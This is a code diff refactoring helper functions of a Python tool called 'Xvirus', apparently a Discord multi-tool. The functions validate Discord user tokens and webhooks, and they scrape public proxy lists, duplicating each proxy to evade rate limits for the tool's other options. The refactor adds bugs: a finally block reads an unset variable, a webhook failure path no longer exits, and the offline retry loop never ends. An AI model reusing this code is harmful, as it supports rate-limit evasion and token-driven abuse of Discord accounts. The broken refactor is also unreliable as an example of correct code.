@@ -352,67 +352,62 @@ def print_slow(_str):
         sys.stdout.write(letter);sys.stdout.flush();sleep(0.04)
 
 def validateToken(token):
-    #contact discord api and see if you can get a valid response with the given token
-    r = requests.get('https://discord.com/api/v10/users/@me', headers=getheaders(token))
-    if r.status_code == 200:
-        #it is a valid token
-        pass
+    headers = getheaders(token)
+    url = 'https://discord.com/api/v10/users/@me'
+    response = requests.get(url, headers=headers)
+    if response.status_code == 200:
+        print(f"{Fore.GREEN}Valid Token.{Fore.RESET}")
+        # Token is valid
     else:
-        #token is invalid
         print(f"\n{Fore.RED}Invalid Token.{Fore.RESET}")
         sleep(1)
         __import__("Xvirus").main()
 
 def validateWebhook(hook):
     try:
-        #try and get a connection with the input
-        responce = requests.get(hook)
-    except (requests.exceptions.MissingSchema, requests.exceptions.InvalidSchema, requests.exceptions.ConnectionError):
-        #connection failed
+        response = requests.get(hook)
+        response.raise_for_status()
+    except requests.exceptions.RequestException:
         print(f"\n{Fore.RED}Invalid Webhook.{Fore.RESET}")
         sleep(1)
         __import__("Xvirus").main()
+
     try:
-        #try and get a value from object
-        j = responce.json()["name"]
+        json_data = response.json()
+        j = json_data["name"]
+        print(f"{Fore.GREEN}Valid webhook! ({j})")
     except (KeyError, json.decoder.JSONDecodeError):
-        #if its a valid link but link isn't a webhook
         print(f"\n{Fore.RED}Invalid Webhook.{Fore.RESET}")
         sleep(1)
-        __import__("Xvirus").main()
-    #webhook is valid
-    print(f"{Fore.GREEN}Valid webhook! ({j})")
+
 
 def proxy_scrape():
-    temp = os.getenv("temp") + "\\xvirus_proxies"
-    
-    if os.path.isfile(temp) and os.stat(temp).st_size > 0:
+    temp_path = os.path.join(os.getenv("temp"), "xvirus_proxies")
+
+    if os.path.isfile(temp_path) and os.stat(temp_path).st_size > 0:
         # Proxies have already been scraped, so return
         return
-    
+
     proxieslog = []
     setTitle("Scraping Proxies")
-    startTime = time.time()
-    #create temp dir
-    temp = os.getenv("temp")+"\\xvirus_proxies"
-    print(f"""{Fore.BLUE}Please wait while {Fore.RED}Xvirus{Fore.BLUE} Scrapes proxies for you!\n(This might take some time)\nIf you have been in this page for too long restart the program!""")
+    start_time = time.time()
     
+    print(f"""{Fore.BLUE}Please wait while {Fore.RED}Xvirus{Fore.BLUE} Scrapes proxies for you!\n(This might take some time)\nIf you have been in this page for too long restart the program!""")
 
-    def fetchProxies(url, custom_regex):
-        global proxylist
+    def fetch_proxies(url, custom_regex):
         try:
             proxylist = requests.get(url, timeout=5).text
-        except Exception:
-            pass
+        except requests.exceptions.RequestException:
+            return
         finally:
             proxylist = proxylist.replace('null', '')
-        #get the proxies from all the sites with the custom regex
-        custom_regex = custom_regex.replace('%ip%', '([0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3})')
-        custom_regex = custom_regex.replace('%port%', '([0-9]{1,5})')
+
+        custom_regex = custom_regex.replace('%ip%', r'([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})')
+        custom_regex = custom_regex.replace('%port%', r'([0-9]{1,5})')
+        
         for proxy in re.findall(re.compile(custom_regex), proxylist):
             proxieslog.append(f"{proxy[0]}:{proxy[1]}")
 
-    #all urls
     proxysources = [
         ["http://spys.me/proxy.txt","%ip%:%port% "],
         ["http://www.httptunnel.ge/ProxyListForFree.aspx"," target=\"_new\">%ip%:%port%</a>"],
@@ -435,24 +430,25 @@ def proxy_scrape():
         ["https://www.hide-my-ip.com/proxylist.shtml", '"i":"%ip%","p":"%port%",'],
         ["https://raw.githubusercontent.com/scidam/proxy-list/master/proxy.json", '"ip": "%ip%",\n.*?"port": "%port%",']
     ]
+    
     threads = [] 
-    for url in proxysources:
-        #send them out in threads
-        t = threading.Thread(target=fetchProxies, args=(url[0], url[1]))
+    for url, custom_regex in proxysources:
+        t = threading.Thread(target=fetch_proxies, args=(url, custom_regex))
         threads.append(t)
         t.start()
+    
     for t in threads:
         t.join()
 
     proxies = list(set(proxieslog))
-    with open(temp, "w") as f:
+    with open(temp_path, "w") as f:
         for proxy in proxies:
-            #create the same proxy 7-10 times to avoid ratelimit when using other options
-            for i in range(random.randint(7, 10)):
+            # create the same proxy 7-10 times to avoid ratelimit when using other options
+            for _ in range(random.randint(7, 10)):
                 f.write(f"{proxy}\n")
-    #get the time it took to scrape
-    execution_time = (time.time() - startTime)
-    print(f"{Fore.GREEN}Done! Scraped{Fore.MAGENTA}{len(proxies): >5}{Fore.GREEN} in total => {Fore.RED}{temp}{Fore.RESET} | {execution_time}ms")
+    
+    execution_time = (time.time() - start_time)
+    print(f"{Fore.GREEN}Done! Scraped{Fore.MAGENTA}{len(proxies): >5}{Fore.GREEN} in total => {Fore.RED}{temp_path}{Fore.RESET} | {execution_time}ms")
     setTitle(f"Xvirus {THIS_VERSION}")
 
 def proxy():
@@ -509,16 +505,15 @@ def getheaders(token=None):
     if token:
         headers.update({"Authorization": token})
     return headers
-
 def check_wifi_connection():
-    while True:
-        try:
-            urllib.request.urlopen('https://www.google.com')
-            break
-        except:
+    try:
+        urllib.request.urlopen('https://www.google.com')
+        # If there is a WiFi connection, pass
+        pass
+    except:
+        while True:
             offline()
             for i in range(5, 0, -1):
                 print(f"{Fore.RED}                                Retrying in {Fore.BLUE}{i} {Fore.RED}seconds", end='\r')
                 time.sleep(1)
-            os.system('cls' if os.name == 'nt' else 'clear')
-    print(f"{Fore.RED}Connection established!")
+            clear()
